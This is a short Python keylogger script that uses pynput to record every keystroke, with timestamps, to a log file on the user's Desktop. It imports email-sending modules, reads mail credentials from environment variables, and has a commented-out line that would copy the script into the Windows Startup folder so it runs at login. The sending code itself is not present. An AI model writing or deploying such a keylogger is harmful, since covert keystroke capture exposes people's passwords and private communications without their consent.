from pynput.keyboard import Listener
import logging, time
from shutil import copyfile
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


EMAIL_ADDRESS = os.environ.get("DEVMAIL_ADDRESS")
EMAIL_PASSWORD = os.environ.get("DEVMAIL_PASSWORD")





username = os.getlogin()
logging_directory = f"C:/Users/{username}/Desktop"
#copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level= logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

def check():
    print("Hello")

with Listener(on_press=key_handler) as listner:
    listner.join()
    check()